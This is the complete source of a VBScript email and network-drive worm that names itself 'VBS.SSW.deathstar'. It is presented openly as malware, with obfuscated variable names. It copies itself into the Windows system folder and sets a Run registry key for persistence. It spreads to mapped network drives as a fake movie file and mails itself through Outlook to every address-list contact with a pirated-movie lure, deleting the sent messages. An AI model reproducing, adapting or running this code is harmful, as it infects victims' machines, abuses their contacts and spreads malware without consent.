' This is VBS.SSW.deathstar
' Written by Bobfan
On Error Resume Next
If Day = "21" and month = "06" Then
MsgBox "Download FREE movies at Antrax-Warez-Archive! Over 500 GB of software, mp3s, pictures, movies and many more!"
End If
Dim SFGETERFTE
Dim ERFTEGZEWDQWDRWRD
Dim UILMOIKLOIUJUILUIK
Dim LUNAGTHBTBBZTJBJ
Dim GTRZHFGBNVFBCGEGZRZ
Dim TIECAQMSPEAK
Dim GTRZFTZRFVTGEGZRZ
Dim REGVTRHHDDFAITHETWET
Dim IFYOUREADTHISYOUARESTUPID
Dim EVTVZFTGTRZHUHUJIZUIJ
Set SFGETERFTE = CreateObject( "Scripting.FileSystemObject" )
SFGETERFTE.CopyFile WScript.ScriptFullName, SFGETERFTE.BuildPath(SFGETERFTE.GetSpecialFolder(1), "vbs.deathstar.vbs" )
Set ERFTEGZEWDQWDRWRD = CreateObject( "WScript.Shell" )
ERFTEGZEWDQWDRWRD.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "vbs.deathstar", SFGETERFTE.BuildPath(SFGETERFTE.GetSpecialFolder(1), "vbs.deathstar.vbs" )
Set UILMOIKLOIUJUILUIK = CreateObject( "WScript.Network" )
Set GTRZHFGBNVFBCGEGZRZ = UILMOIKLOIUJUILUIK.EnumNetworkDrives
If GTRZHFGBNVFBCGEGZRZ.Count <> 0 Then
   For LUNAGTHBTBBZTJBJ = 0 To GTRZHFGBNVFBCGEGZRZ.Count - 1
       If InStr(GTRZHFGBNVFBCGEGZRZ.Item(LUNAGTHBTBBZTJBJ), "\") <> 0 Then
          SFGETERFTE.CopyFile WScript.ScriptFullName, SFGETERFTE.BuildPath(GTRZHFGBNVFBCGEGZRZ.Item(LUNAGTHBTBBZTJBJ), "starwars-episode3_ripped_by_antrax.avi.vbs")
End If
   Next
End If
LUNAGTHBTBBZTJBJ = ERFTEGZEWDQWDRWRD.RegRead("HKEY_LOCAL_MACHINE\" & "vbs.deathstar")
If LUNAGTHBTBBZTJBJ = "" Or LUNAGTHBTBBZTJBJ > 20 Then
   LUNAGTHBTBBZTJBJ = 0
End If
If LUNAGTHBTBBZTJBJ = 0 Then
Set REGVTRHHDDFAITHETWET = CreateObject( "Outlook.Application" )
   Set TIECAQMSPEAK = REGVTRHHDDFAITHETWET.GetNameSpace("MAPI")
   For Each GTRZFTZRFVTGEGZRZ In TIECAQMSPEAK.AddressLists
       Set GTRZHFGBNVFBCGEGZRZ = REGVTRHHDDFAITHETWET.CreateItem(0)
       For IFYOUREADTHISYOUARESTUPID = 1 To GTRZFTZRFVTGEGZRZ.AddressEntries.Count
           Set EVTVZFTGTRZHUHUJIZUIJ = GTRZFTZRFVTGEGZRZ.AddressEntries(IFYOUREADTHISYOUARESTUPID)
           If IFYOUREADTHISYOUARESTUPID = 1 Then
              GTRZHFGBNVFBCGEGZRZ.BCC = EVTVZFTGTRZHUHUJIZUIJ.Address
           Else
              GTRZHFGBNVFBCGEGZRZ.BCC = GTRZHFGBNVFBCGEGZRZ.BCC & "" & EVTVZFTGTRZHUHUJIZUIJ.Address
           End If
       Next
       GTRZHFGBNVFBCGEGZRZ.Subject = "Get a FREE copy of Star Wars Episode 3!"
       GTRZHFGBNVFBCGEGZRZ.Body = "Yes, thats true! We want to send our newly ripped movie release to all the people out there! Want to contribute? Contact us! Look the attached movie and send us your feedback: antraxwarez@yahoo.com"
       GTRZHFGBNVFBCGEGZRZ.Attachmets.Add WScript.ScriptFullName
      GTRZHFGBNVFBCGEGZRZ.DeleteAfterSubmit = True
       GTRZHFGBNVFBCGEGZRZ.Send
   Next
LUNAGTHBTBBZTJBJ = 0
End If
ERFTEGZEWDQWDRWRD.RegWrite "HKEY_LOCAL_MACHINE\" & "vbs.deathstar", LUNAGTHBTBBZTJBJ + 1
